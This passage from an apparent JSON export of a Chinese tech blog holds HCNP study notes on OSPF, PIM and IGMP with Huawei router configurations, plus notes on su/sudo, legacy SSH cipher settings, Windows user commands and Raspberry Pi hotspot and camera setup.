username，然后输入password就ok了，可是root用su切换到其它身份的时候是不须要输入password的。 sudo是一种权限管理机制，依赖于/etc/sudoers，其定义了授权给哪个用户可以以管理员的身份能够执行什么样的管理命令。 2、格式上： su格式为两种：su -l USERNAME（-l为login，即登陆的简写）、su USERNAME。 sudo格式：sudo -u USERNAME COMMAND。 3、默认情况下： su默认情况下如果不指定USERNAME（用户名），默认即为root，所以切换到root的身份的命令即为：su -root或su -，su root 或su。 sudo默认情况下，系统只有root用户可以执行sudo命令。需要root用户通过使用visudo命令编辑sudo的配置文件/etc/sudoers，才可以授权其他普通用户执行sudo命令。 4、密码上： 两个命令的最大区别是：sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码。 5、日志记录上： 尽管 sudo 命令是以目标用户（默认情况下是 root 用户）的身份执行命令，但是它们会使用 sudoer所配置的用户名来记录是谁执行命令。而 su 命令是无法直接跟踪记录用户切换到 root 用户之后执行了什么操作。 6、灵活性 sudo 命令比 su 命令灵活很多，因为甚至可以限制 sudo 用户可以访问哪些命令。换句话说，用户通过 sudo 命令只能访问他们工作需要的命令。而 su 命令让用户有权限做任何事情。 shutdown -h now //关机 nano /etc/wpa_supplicant/wpa_supplicant.conf interface wlan0 static ip_address=192.168.43.133/24 static routers=192.168.43.1 static domain_name_servers=223.5.5.5 lsusb ls /dev/tty* /dev/ttyUSB0 sudo apt-get install vim sudo vim /etc/vim/vimrc syntax on ssh -oHostKeyAlgorithms=+ssh-dss netmanage@172.30.0.200 ssh -o HostKeyAlgorithms=+ssh-dss netmanage@172.30.0.200 Host 172.30.0.200 Ciphers 3des-cbc KexAlgorithms +diffie-hellman-group1-sha1 .ssh 加密方法和密钥交换方式登陆设置方法本地ssh需要进行设置 针对用户设置 vi ~/.ssh/config 针对系统设置 sudo vi /etc/ssh/ssh_config 文件最后添加密钥交互算法,提示缺啥就添加啥： Host * KexAlgorithms +diffie-hellman-group1-sha1Ciphers 3des-cbc或者直接在.ssh/目录下添加config文件 Host * #所有ip Host xxx.xxx.xxx.xxx #指定ip Ciphers 3des-cbc # xxx 各种密码加密方法KexAlgorithms +diffie-hellman-group1-sha1 user xxx Host xxx.xxx.xxx.xxx Port 22 # 或对应服务器的ssh端口","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"VIM使用","slug":"VIM使用","permalink":"http://sakuramuxia.github.io/tags/VIM%E4%BD%BF%E7%94%A8/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记18","slug":"hcnp18","date":"2021-07-06T06:45:00.000Z","updated":"2021-07-06T05:16:27.023Z","comments":true,"path":"post/dc48.html","link":"","permalink":"http://sakuramuxia.github.io/post/dc48.html","excerpt":"","text":"OSPF内部路由 只有在Update中才会包含真正的LSA信息完整 LSU 中有3条LSA，LSA类型为3，LSAge年龄，Options，类型，ID，宣告着，序列号，校验和，长度，掩码，TOS，度量值。 Age是往上增加的。 序列号30分钟改变一次 实验 dis ospf lsdb router //验证ospf数据库路由表 int g0/0/0 //进入相关接口 ospf network-type p2p //更改网络类型为P2P LSA类型详解 类型1 Router -LSA P2P网路 1 2 3 4 5 7 重点学习类型 传播范围 携带内容 谁发送的 当改变网络类型为P2P，查看类型1 的数据库信息,右侧为Broadcast，右侧为P2P。 Option：E代表支持外部路由 seq：默认为80000001 序列号 一条链路和一条LSA是不一样的 链路就是接口，是不是等价于接口数量 stubnet：末节网络 TransNet：传输网络 在一个区域中所有路由器中的LSDB的数据库必然是一样的 类型1==Router LSA在每一种类型中有不同的规则，有不同的链路信息（Link Count） 在类型1中既有拓扑信息，又有路由信息。 链路状态路由协议，主要是首先去收集拓扑信息然后基于拓扑信息去计算路由信息，那么在LSA中既会包含拓扑信息也会包含路由信息，有些两个都包含，有些只包含一个，有些会包含另外一个， LSA人类思考和机器是反的， 根据LSDB中的数据把拓扑图还原出来。 类型1 Router -LSA MA网络 类型2 Network-LSA MA网络 假设中间有一台路由器，他有三个接口，每一个接口连接有DR，那么他就会产生三个类型二的LSA。 类型1的LSA信息跟路由器的数量有关系，路由器有几个，类型1的LSA就有几个。 类型2的LSA是看接口上DR的数量，这个就要看这个区域中有多少个MA的网络。有多少个MA的网络就有多少个DR，有多少个DR就会产生多少个类型2 dis ospf LSDB network //验证ospf 类型2 的lsa信息 reset ospf process //重启ospf进程 当Age 增加到3600秒时 LSA就会消失 3600 最大生存时间 这个图上边是MA网络，下边也是MA网络，必然就会有DR，首先看类型1 的LSA，有几台路由器就会产生几条 域内路由计算案例 dis ospf lsdb router self-originate //查看ospf数据库自己产生的详细信息 dis ospf lsdb self-originate //查看ospf数据库自己产生的信息 DR其实就是一个伪节点 拓扑信息就是根据路由信息找周围的RouterID。 只要出现过的节点，放在树中，就不会再去筛选（指的是在候选表中筛选） 三张表构建一个树，一个是数据库，一个是候选表，一个是树。 演示通俗的版本 LSA类型3dis ospf lsdb //查看ospf数据库 dis ospf LSDB router //查看ospf lsdb类型1 信息 //相当于火车站，汽车站，机场 为什么在区域1中的路由信息要通过类型3传播到区域0，原因是因为如果通过类型1传播到区域0的话，那么就没必要再划分区域了，他们就属于了同一个区域，如果区域0中的路由器直接发送路由信息到区域2中，区域2中的路由器不知道区域0中的路由器，所以就需要该区域的ABR重新生成类型3的LSA。 dis ospf abr-asbr //用于专门查看ABR ASBR reset ospf process //重置ospf进程 ABR，虚连接，都是在LSA type1中的Hello包中。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"OSPF内部路由","slug":"OSPF内部路由","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%86%85%E9%83%A8%E8%B7%AF%E7%94%B1/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记17","slug":"hcnp17","date":"2021-07-01T06:45:00.000Z","updated":"2021-07-01T08:30:44.113Z","comments":true,"path":"post/d808.html","link":"","permalink":"http://sakuramuxia.github.io/post/d808.html","excerpt":"","text":"OSPF多区域 OSPF单区域 一个区域内LSA有很多类型，NP要学习6个类型，123457，在一个区域中他靠的是类型1和类型2，类型1和类型2就可以构建区域内的所有路况信息， 但是区域间就需要类型3，也就是说类型1和2描述的是路况的详细信息，但是类型3就不需要描述的十分详细，我只需要汇总成或者说变成一个其他类型的，而这种类型就会变得简单很多，传到其他区域，类型1和2不会传到其他区域，他会通过类型3传到其他区域，有了1 2 和3 ospf就完全可以构建了。 区域划分 实验 三类LSDB 只要是从其他区域来的都是三类LSA 域间路由防环区域间内有SPF算法，保证不会有环路产生 虚连接 区域0不通过区域2，而是通过虚连接直接传给区域4 当两个区域0内的路由器down之后呢，就会出现两个区域0，区域0左侧路由器有一个回环口，发送一个数据包给区域1的路由器，区域1右侧的路由器就不会发送数据包给区域0右侧的路由器，这样就不连续了，建立一个虚连接让他们连贯起来，作为一个冗余备份链路。 dis ospf vlink //验证虚链路的邻居 dis ospf peer b //验证ospf邻居状态 虚连接的Hello包是单播的形式 R2和R3建立虚连接之后的拓扑图可以想象成这样的形式，R3的左侧连接区域0，右侧连接区域1，区域1的路由信息通过骨干区域，然后骨干区域再传给R3，R3就学到了全部的路由。 OSPF报文 虚连接的邻居是建立在物理路由邻居建立完成的前提下完成的。直连的不可以如下图 上图可以建立虚连接 上图建立不起来虚连接 Hello间隔和Dead间隔中间相差4倍关系 类型 完整的数据信息包含在Update中（LSU）。 LSA 和LSAck中的信息都是摘要信息。 Hello定时器 虚链路的定时器间隔基于物理口的类型 单播需要手动配置邻居 peer 23.0.0.3 int g0/0/1 ospf network-type p2p //更改ospf 网络类型为P2P","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"OSPF多区域","slug":"OSPF多区域","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%A4%9A%E5%8C%BA%E5%9F%9F/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记16","slug":"hcnp16","date":"2021-07-01T02:05:00.000Z","updated":"2021-07-01T02:21:56.578Z","comments":true,"path":"post/18c9.html","link":"","permalink":"http://sakuramuxia.github.io/post/18c9.html","excerpt":"","text":"OSPF基础 技术背景 RIP中有一个计时器，每30秒进行以此更新， OSPF工作流程 OSPF基本工作原理 建立邻居 链路层封装PPP，帧中继FR 邻居建立完成之后，两个路由器互相发送一个数据库描述的包DD，这时候的状态叫做Exstart，它这个状态的目的是为了选举出一个Master和Slave，主仆关系的选举靠seq这几个序列号进行选举，I代表是不是第一个数据包，M代表是不是后边还有，MS代表是Master还是Slave，互相发送之后比较RouteID 这个只比较RouteID，数字越高，地址越大越优先，路由器B通过比较DD发现，A的数据B都有了，于是早早的就进入了Full状态，但是A发现B的数据A却没有于是进入LSR请求状态，向B请求，B于是就给了A更新，⑥请求中包含了LSA的头部信息，⑦；更新里面包含了LSA的完整信息，③④⑤中包含了LSA的摘要信息， 状态机 七种状态机制： Down，Init，2-way，Exstart，Exchange，Full，Loading，Attempt。 RTA到达回环口192.168.3.3的开销是G1+G3+回环口的开销（华为的默认为0，思科的默认为1，回环口的默认带宽为8Gbps） 网络类型 以太网口，PPP，帧中继，串口网络1.544M，2.048M带宽， 背板带宽： 背板带宽也称为背板容量，名词解释为：交换机的处理接口器和接口卡与数据总线所能吞吐的最大数据量。它代表了交换机整体的数据交换能力，单位是Gbps，叫交换带宽，通常我们能接触到的背板带宽有几Gbps到几百Gbps不等。 包转发率： 交换机的包转发率，也称为端口吞吐量，是交换机在某个端口进行数据包转发的能力，单位通常为pps，叫包每秒，即每秒钟内所转发数据包的个数。 这里补充一个网络小常识：网络数据传输通过数据包，数据包的构成是传输的数据+帧头+帧间隙。网络中规定一个数据包最小为64字节，这里的64字节就是单纯的数据，加上8字节帧头和12字节帧间隙，那么网络中最小的包就是84字节。 那么一个全双工的千兆接口达到线速时包转发率就要=1000Mbps/((64+8+12)*8bit)＝1.488Mpps。 对于万兆以太网，一个线速端口的包转发率为14.88Mpps。 对于千兆以太网，一个线速端口的包转发率为1.488Mpps。 对于百兆以太网，一个线速端口的包转发率为0.1488Mpps 如：一台24个千兆端口的桌面交换机（连接电脑），其最大吞吐量应达到24*1.488Mpps=35.712Mpps，才能保证所有端口线速工作时，提供无阻塞的包交换。 链路层协议 帧中继网络就是NBMA，DR、BDR就相当于是否需要多路访问 P2MP点到多点访问， OSPF网络类型：基于接口 MA网络中的问题 DR与BDR DR BDR 都有一个终身制，虽然是后边进来的，但是不会抢占DR或BDR，除非DR BDR发生故障 DR BDR的选举规则，先看优先级再看route ID 相关命令 思科设备配置 单区域配置 查看OSPF邻居状态 查看OSPF的LSDB 查看OSPF路由表","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"OSPF基础","slug":"OSPF基础","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%9F%BA%E7%A1%80/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记15","slug":"hcnp15","date":"2021-06-27T05:05:00.000Z","updated":"2021-06-27T05:21:42.782Z","comments":true,"path":"post/1989.html","link":"","permalink":"http://sakuramuxia.github.io/post/1989.html","excerpt":"","text":"PIM-DM配置 注意：应该先敲pim 再敲igmp PIM-SM 实验拓扑 DR相当于IGMPv1中的查询器的功能，指定路由器 RP以某个路由器作为路由器的树根，这个跟常被称为RP（汇合点或核心） RPT共享树 SPT最短路径树也称为“源树” sys sys R1 int g0/0/0 ip add 12.0.0.1 24 vrrp vrid 1 virtual-ip 12.0.0.254 vrrp vrid 1 pri 200 int g0/0/1 ip add 15.0.0.1 24 ospf 1 router-id 1.1.1.1 area 0 net 12.0.0.0 0.0.0.255 net 15.0.0.0 0.0.0.255 //调整优先级，默认是100，让他成为master sys sys R2 int g0/0/0 ip add 12.0.0.2 24 vrrp vrid 1 virtual-ip 12.0.0.254 int g0/0/1 ip add 26.0.0.2 24 ospf 1 router-id 2.2.2.2 area 0 net 12.0.0.0 0.0.0.255 net 26.0.0.0 0.0.0.255 int lo 2 //新建一个回环口 IP add 2.2.2.2 32 ospf 1 area 0 net 2.2.2.2 0.0.0.0 sys sys R3 int g0/0/0 ip add 35.0.0.3 24 int g0/0/1 ip add 34.0.0.3 24 vrrp vrid 1 pri 200 vrrp vrid 1 virtual-ip 34.0.0.254 igmp en ospf 1 router-id 3.3.3.3 area 0 net 34.0.0.0 0.0.0.255 net 35.0.0.0 0.0.0.255 sys sys R4 int g0/0/0 ip add 45.0.0.4 24 int g0/0/1 ip add 34.0.0.4 24 vrrp vrid 1 virtual-ip 34.0.0.254 igmp en ospf 1 router-id 4.4.4.4 area 0 net 34.0.0.0 0.0.0.255 net 46.0.0.0 0.0.0.255 //静态指定RP地址 pim static-rp xxx.xxx.xxx.xxx //在每一个路由器上指定RP地址 //在同一个组播组中的路由器都要查RP地址是否一样 dis pim rp-info //验证pim rp信息 int lo 4 //新建一个回环口 IP add 4.4.4.4 32 ospf 1 area 0 net 4.4.4.4 0.0.0.0 int lo 4 //进入lo 6 pim sm //开启pim 稀疏模式 pim c-bsr lo 4 //后边接接口信息 sys sys R5 int g0/0/0 ip add 15.0.0.5 24 int g0/0/1 ip add 35.0.0.5 24 int g0/0/2 ip add 56.0.0.5 24 ospf 1 router-id 5.5.5.5 area 0 net 15.0.0.0 0.0.0.255 net 35.0.0.0 0.0.0.255 net 56.0.0.0 0.0.0.255 //配置一个回环口的地址用作静态,指定RP的地址就是回环口的地址，这个是静态配置，动态配置要指定 。 int lo 5 ip add 5.5.5.5 32 ospf 1 a 0 net 5.5.5.5 0.0.0.0 int lo 5 //进入lo 6 pim sm //开启pim 稀疏模式 pim c-bsr lo 5 //后边接接口信息 sys sys R6 int g0/0/0 ip add 26.0.0.6 24 int g0/0/1 ip add 46.0.0.6 24 int g0/0/2 ip add 56.0.0.6 24 ospf 1 router-id 6.6.6.6 area 0 net 26.0.0.0 0.0.0.255 net 46.0.0.0 0.0.0.255 net 56.0.0.0 0.0.0.255 int lo 6 //新建一个回环口 IP add 6.6.6.6 32 ospf 1 area 0 net 6.6.6.6 0.0.0.0 //动态配置c-bsr int lo 6 //进入lo 6 pim sm //开启pim 稀疏模式 pim c-bsr lo 6 //后边接接口信息 右边PC配置 PC1 IP地址:34.0.0.1 255.255.255.0 34.0.0.254 PC2 IP地址:34.0.0.2 255.255.255.0 34.0.0.254 左边组播源配置 源 IP地址:12.0.0.100 255.255.255.0 12.0.0.254 //开启密集模式 6台路由器都刷一遍 dis pim nei //查看pim邻居 dis pim nei verbose //查看pim详细信息 multicast rooting-enable int g0/0/0 pim dm int g0/0/1 pim dm int g0/0/2 pim dm int g0/0/0 pim sm int g0/0/1 pim sm int g0/0/2 pim sm ----- DR的选举规则是先比较优先级，再比较IP地址 ----- dis pim int g0/0/0 verbose//验证DR 多路访问的接口都会有DR igmp en //开启igmp dis igmp int g0/0/0 //验证igmp配置 igmp选择查询器的时候是IP地址越小越优先 dis pim rp-info //验证pim rp信息 //开启密集模式 6台路由器都刷一遍 dis pim nei //查看pim邻居 dis pim nei verbose //查看pim详细信息 dis pim routing-table //验证pim路由表 PIM-SM工作流程邻居发现DR竞选 说明： 组播源侧构建的是SPT（源树）左边的是（S，G），组播接收者构建的是RPT（共享树）右边的是（*，G）。 密集模式的数据包结构 稀疏模式的数据包结构 RPT构建 组播源注册 //从DR到RP建立的是SPT（源树），从RP到组成员是RPT（共享树） 组播源注册过程 组播源注册停止过程 /R5，R6，R4路由器都关闭切换操作 static-rp 5.5.5.5 pim //进入pim模式 spt-switch-threshold infinity //停止切换 说明： Join报文和register-Stop报文是通过G0/0/0 这一个接口发送给12.0.0.2这个接口的。register报文和组播报文是通过R2的右边接口发送出去的。 PIM-SM转发树 SPT切换 路由器B是RP，当我们收到了第一份组播数据的时候，本来第一份数据应该是从A到B再到D的路径，从组播源到A再到B是源树，从B到D是共享树，当组播成员端的DR，收到了第一份数据后，他就会沿着组播源的方向，发送join消息，join消息的目的是把D到B，B到A的流量剪掉，使得流量的走势是从A到D这个方向走，这个时候A路由器建立的是（S，G），对于源树来讲，他会查找路由器找到最优路径，所以接下来的流量就会从A到D这样转发， 组播报文到达成员端DR，成员端DR马上向源这个方向发送join消息，按照图示红色虚线方向发送，那么这些路由器就会建立（S，G），之前这些流量是从源端DR传到RP，再由RP通过RPT传下来的，所以这些流量要被修剪掉，这边有一个判断，接下来我会发送一个剪枝的消息，把流量剪掉如图绿色箭头方向，这个判断是，如果我们的组播报文没有经过RP，没有经过相关的路由器，我们根据单播路由查找，找到我们的源是通过红色虚线方向，中间的那个路由器发现流量的变化就会告诉上游路由器，进行剪枝操作，上游路由器再告诉上游路由器，进行剪枝。 SPT切换规则 PIM使用的是ASM模型 RP发现 dis pim rp-info xxx.xxx.xxx.xxx//验证pim-rp信息,xxx代表组播地址 RP配置 BSR选举规则 int lo 6 //新建一个回环口 IP add 6.6.6.6 32 ospf 1 area 0 net 6.6.6.6 0.0.0.0 int lo 4 //新建一个回环口 IP add 4.4.4.4 32 ospf 1 area 0 net 4.4.4.4 0.0.0.0 int lo 4 //进入lo 4 pim sm //开启pim 稀疏模式 pim c-bsr lo 4 //后边接接口信息 dis pim bsr-info //验证pim bsr信息 --------------------------------- pim c-bsr priority xxx //更改BSR优先级为xxx 说明： 先配置c-bsr，然后由c-bsr竞选出来bsr，然后配置c-rp，再由c-rp竞选出来rp。 C-RP竞选过程 RP选举规则 PIM-SM配置 BSR发送给组播所有路由器的打包信息数据包 里边包括所有C-RP的信息 dis pim rp-info xxx.xxx.xxx.xxx //验证pim组播xxx.xxx.xxx.xxxRP竞选结果信息 static-rp 5.5.5.5 preferred //静态优先5.5.5.5 c-rp loopback 5 group-policy yyyy//配置回环口5组播组范围，yyyy为acl的ID acl yyyy //建立acl yyyy rule per source 236.0.0.0 3.255.255.255 R5始终使用RP作为组播源就代表R5不能切换。 igmp -g //全局开启igmp int g0/0/0 //进入相关接口 igmp static-group 239.9.9.9 //静态添加igmp静态组成员 239.9.9.9 mld相当于ipv4中的igmp 降低用户侧网络资源消耗，相当于在交换机上配置igmp snoping。 要求在RTE和RP之间建立RPT，相当于在RTE上配置组成员DR，调高RTE的优先级。建立RPT。 马上收到组播数据，相当于要配置一个igmp的静态","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"PIM","slug":"PIM","permalink":"http://sakuramuxia.github.io/tags/PIM/"},{"name":"PIM SM","slug":"PIM-SM","permalink":"http://sakuramuxia.github.io/tags/PIM-SM/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记14","slug":"hcnp14","date":"2021-06-14T07:05:00.000Z","updated":"2021-06-14T09:59:21.955Z","comments":true,"path":"post/d948.html","link":"","permalink":"http://sakuramuxia.github.io/post/d948.html","excerpt":"","text":"IGMP Snooping技术背景对组播的数据进行优化，能够指定那些端口发送或不再发送组播数据。 IGMP Snooping 概述 IGMP Snooping 工作原理 郑好办 豫事办 IGMP配置 //有路由器首先在路由器的两端开启pim pim dm //开启pim，这个是在三层交换机的时候再配置的。 //UDP的报文 //当开启IGMP snooping时，路由器发送report报文时，经过交换机过不去，PC回复的报文也回不来，但是交换机都能看得到，可以配置静态IGMP静态报文。 //路由器配置静态报文 //模拟器的bug int g0/0/0 igmp static-group 228.1.1.1 dis igmp group static //查看IGMP静态组成员 //交换机验证igmp-snooping配置 dis igmp-snooping configuration dis igmp-snooping VLAN 1 //查看IGMP-snooping VLAN1下的配置 组播分发技术组播的路由技术，之前的是组播，路由器和主机之间的技术，IGMP，主要是负责组成员的管理，IGMP再扩展到IGMP snooping，如果交换机支持IGMP Snooping的话，他就会优化组播的转发。 组播分发拓扑 实验拓扑 PC1的IP地址为1.0.0.1 255.0.0.0. AR1的左边接口要开启IGMP因为他是根主机相连接的，同时两边都还要开启PIM，类似于路由表，服务器发送的数据通过查找路由表再把数据进行转发。 sys sys R1 multicast routing-enable //全局开启组播 int g0/0/0 pim dm/sm //开启pim dm IGMP enable //开启IGMP int g0/0/1 //进入相关接口 pim dm //开启pim dm模式 dis multicast routing-table //查看组播路由表 dis pim routing-table //查看pim路由表 组播路由表项 SPT iif：代表上游口（蓝色）组播数据的入接口为上游 oiflist：代表下游口（红色）组播数据的出接口为下游 RPT 路由器C的组播路由项不需要知道组播源的地址。路由器D两个都知道。 分发数比较 dis pim int g0/0/0 //查看接口pim协议信息 dis pim int g0/0/0 verbose//查看接口pim协议详细信息 RPF用于防环机制 组播数据转发和防环 //下游口是由IGMP来的,学的东西表达出来 当路由器E收到组播报文后，首先确定一件事，从接口1口收到组播报文后，我要确定这个接口是不是连接到组播源的接口（服务器接口2），如果确定是，再往下转发，当路由器D收到组播报文后，收到组播数据的接口4，是不是连接到组播源的接口2，是的话，才会转发，也就是说上游口怎么出来的必须做一个判断，怎么判断这个接口是不是连接到组播源的呢 就需要用到单播路由，把源地址（服务器地址）作为目标地址在单播路由表中查找，路由表项，查到的出接口如果正好是组播报文的入接口，则检查成功。 单播路由的出接口是在路由器 A的2接口，而组播报文的入接口是在1接口，所以RPF检查失败，报文丢弃。 如果有一个是等价路由的话，默认配置中，只选一条路，有选举规则的，比较组播优先级，静态最优先，MBGP，单播路由ospf，比较下一跳地址最大的作为RPF路径。也可以开启负载两条路都可以用。 优先级越小越优先 PIM 不管以那种方式产生的，只要有结果即路由表就可以。 PIM模式 密集模式用的是源树（SPT），而稀疏模式用的是共享树（RPT）共享树最后还会切换到源树。 assert：断言 graft 嫁接 state refresh 状态刷新 prune 剪枝 dis pim neighbor //查看pim邻居 dis pim int g0/0/0 //查看pim接口信息 dis pim int g0/0/0 verbose//查看pim接口详细信息 实验拓扑 PIM-DM工作流程 这里选择DR的时候看优先级，和IP地址，越大越优先。 PIM数据包结构Hello包结构 PIM协议号是103 PIM-DM邻居发现 dis pim routing-table //查看pim路由信息表 dis igmp group //查看igmp组成员 PIM剪枝数据包 爱像风卷起烟火，我在你给的景色中甘心陷落 “你要是在我身边就好了”，这句话并不是在怪你。而是这瞬间，我比平时要更想你。 等风起，等花开，等我们再次相遇。 你在，春华秋实夏蝉冬雪。你不在，春夏秋冬。 剪枝定时器：被裁剪的下游接口默认保持210秒，超时后恢复转发。 形成周期性的“扩散-剪枝” 状态刷新（State Refresh） 为了保证被裁减的接口永远被裁减，而不是超时后恢复转发。 嫁接（Graft） 断言（Assert） 断言消息中是有单播路由信息的,就是上边这三台路由器分别到达组播源的路由信息，每一个组播报文中都有一个组播源，组播源单播路由表中会有信息，如果说A用的是静态，B用的是OSPF，C用的是BGP，根据优先级知道，BGP的优先级是最低的255。比的是到组播源的单播路由的优先级，单播路由的开销。 断言对应拓扑图 断言对应数据包结构 当R1的下游口down了之后，由于R4之前被断言了，R4的下游口没有出现，需要等待邻居检测down掉，R4下游口就会出现了，当R1的下游口恢复之后，我们还会抓到断言的数据包，邻居起来了之后，（需要180秒左右）R4的下游口就又消失了，这就和BFD联动有关系了。 dis pim neighbors verbose //查看pim 邻居详细信息 BFD与PIM联动 bfd //全局开启bfd int g0/0/0 //进入相关的接口 pim bfd enable //开启bfd与pim联动 //注意bfd只能与pim的sm模式相对应 pim holdtime assert x //配置保持断言状态时间","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"PIM","slug":"PIM","permalink":"http://sakuramuxia.github.io/tags/PIM/"},{"name":"PIM DM","slug":"PIM-DM","permalink":"http://sakuramuxia.github.io/tags/PIM-DM/"},{"name":"IGMP Snooping","slug":"IGMP-Snooping","permalink":"http://sakuramuxia.github.io/tags/IGMP-Snooping/"}],"author":"SakuraMuxia"},{"title":"常用教程","slug":"常用教程","date":"2021-06-14T07:05:00.000Z","updated":"2021-08-03T02:14:14.395Z","comments":true,"path":"post/aaaaaaa.html","link":"","permalink":"http://sakuramuxia.github.io/post/aaaaaaa.html","excerpt":"","text":"DOS命令用户操作命令net user / 显示当前账户信息 net user xxx /显示用户xxx的详细信息 net user /help net user 命令帮助 net user username password /add //添加用户账户 net user username password /delete //删除用户账户 cls //清屏 net localgroup //用户组操作，提升用户的权限 net localgroup administrator xxx /add //添加xxx到administrator用户组下 ipconfig /flushdns //刷新dns ipconfig /displaydns //查看dns net share //查看共享文件夹 树莓派创建热点 #创建WiFi热点使用的GitHub上一个开源项目： https://github.com/oblique/create_ap #将代码copy到本地，安装 sudo git clone https://github.com/oblique/create_ap cd create_ap sudo make install #安装依赖的库 sudo apt-get install util-linux procps hostapd iproute2 iw haveged dnsmasq sudo apt-get install util-linux procps hostapd iproute2 iw haveged dnsmasq -y #开启热点： sudo create_ap --no-virt wlan0 eth0 raspi 12345678 #注意： 开启热点前不能连接其他热点，可以编辑 sudo vim /etc/wpa_supplicant/wpa_supplicant.conf network={ ssid=\"Aqua\" psk=\"12345678a\" } #开机自启方法1： sudo nano /usr/lib/systemd/system/create_ap.service 然后在最下方加上下面语句： ExecStart=/usr/bin/create_ap -n wlan0 热点名 密码 保存退出，然后执行一下语句： systemctl daemon-reload systemctl enable create_ap.service systemctl start create_ap.service reboot #开机自启方法2： sudo mkdir /home/pi/.config/autostart cd /home/pi/.config/autostart sudo vim testboot.desktop 编辑以下内容 [Desktop Entry] Type=Application Name=testboot NoDisplay=true Exec=/home/pi/ap.sh 创建开启热点脚本 sudo vim /home/pi/ap.sh 编辑以下内容 sudo create_ap --no-virt wlan0 eth0 raspi 12345678 重启树莓派 sudo reboot 树莓派摄像头拍照录制监控对树莓派进行更新 sudo apt-get update sudo apt-get upgrade 打开树莓派的配置界面 sudo raspi-config 打开Camera功能 想使用树莓派摄像头拍照很简单，在终端输入命令即可。这里使用的是树莓派系统中的raspistill命令 raspistill -o a.jpg -t 1000 这行命令的作用是在一秒钟的延迟之后，拍下一张名为a.jpg的照片，保存在树莓派的主目录下。-t的延迟选项后的参数是以毫秒为单位，1000便表示1秒。延时选项在输入命令时可以不加，但-o后的名称是一定要有的。 录像功能 同样是使用输入命令的方式实现。命令如下 raspivid -o b.h264 -t 10000 -w 1280 -h 720 该命令的意思是录制一段十秒钟的名为b.h264的视频，且分辨率为1280x720。同样，如果不带名称后的参数的话，系统会默认录制时间为5秒，分辨率为1920x1080。 此时录制的视频虽然能够在树莓派上播放，但并非是能够在一般播放器上运行的常规视频文件，且录制的视频是没有声音的。要想将.h264格式的视频转换为mp4格式的视频，需要使用一个叫做gpac的工具。sudo apt-get install -y gpac 安装后输入以下命令对刚才的视频进行格式转换，转换后的视频为每秒30帧。 MP4Box -fps 30 -add b.h264 b.mp4 监控功能： 使用Linux下一款开源监控软件：motion 输入命令进行安装： sudo apt-get install motion 首先将motion软件的后台进程改为开启，让它能够一直在后台运行。输入以下命令，将文件中 “start_motion_daemon=no” 的no改为yes。 sudo nano /etc/motion/motion.conf 这个文件中保存了许多motion的基本设置，文件内容很多，感兴趣的话可以慢慢研究。因为选项比较多，下面只写出一些比较重要的选项的值，其他可以用默认值，或者参考motion官网上的documents，那里面写得很详尽，每个参数的解释都有。motion.conf里自带的注释也很完整。 需要更改的参数有以下几行，在nano编辑器环境下可以使用快捷键ctrl+w对关键字进行查找。 daemon on #off改成on width 640 height 480 #根据摄像头像素自行更改 framerate 50 #帧率 stream_maxrate 200 stream_localhost off #设为off 当然要想获得最佳的效果，文档中的参数需要多次根据自己的设备进行相应的调整。 修改完成后保存并退出。 若你之前打开过motion，那么在每次更改完配置后，需要先关闭motion进程，并再次打开，相当于对motion进行一次重启。关闭motion服务的命令如下： sudo killall -TERM motion 接着输入命令重新打开motion sudo motion 打开后便可以通过在浏览器内访问地址http://树莓派IP:8081,看到相应的监控画面了。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"DOS","slug":"DOS","permalink":"http://sakuramuxia.github.io/tags/DOS/"},{"name":"树莓派","slug":"树莓派","permalink":"http://sakuramuxia.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记13","slug":"hcnp13","date":"2021-06-09T01:09:00.000Z","updated":"2021-06-14T10:01:40.444Z","comments":true,"path":"post/1b09.html","link":"","permalink":"http://sakuramuxia.github.io/post/1b09.html","excerpt":"","text":"组播组播基础 //ospf 组播地址 224.0.0.5 224.0.0.6 技术背景 //CDN 内容分发网络 10几年前的技术 //合肥电信 就近的CND服务器 缓存 代理 服务器 //BGP 全部都是单播 单播点到点问题信息量和需求成正比 广播点到多点问题 组播解决方案 组播定义 组播基本概念 路由协议分类 组播与电视节目对比 组播的优劣势 组播地址 //选择组播源 IGMP协议(路由器)和PIM协议（主机） 组播地址定义 组播IP地址定义 // 224.0.0.9 ripv2 //主机请求的是组播路由器地址，但是路由器回复的是所有主机和路由器。 组播MAC地址 丢失了5位的地址信息，直接结果是有32个IPv4组播地址映射到同一MAC地址上。 //MAC地址是16进制表示，IP地址是用10进制表示 //交换机是学不到组播地址的，也学不到广播地址，学的是源MAC。未知的单播也会泛洪。没有IGMP的监听功能，要不然就只能泛洪。 组播架构 //主机接入 IGMP 组播路由 PIM //windows service 流媒体服务器 //远程教学：红蜘蛛 极域 VNC 组播基本架构 dis igmp group //查看IGMP群组 dis pim routing-table //查看pim路由表 dis ip routing-table //查看ip路由表 说明： PC1的IP地址为：1.0.0.1 255.0.0.0 1.0.0.254 PC2的IP地址为：1.0.0.2 255.0.0.0 1.0.0.254 PC3的IP地址为：1.0.0.3 255.0.0.0 1.0.0.254 MCS1的IP地址为：2.0.0.100 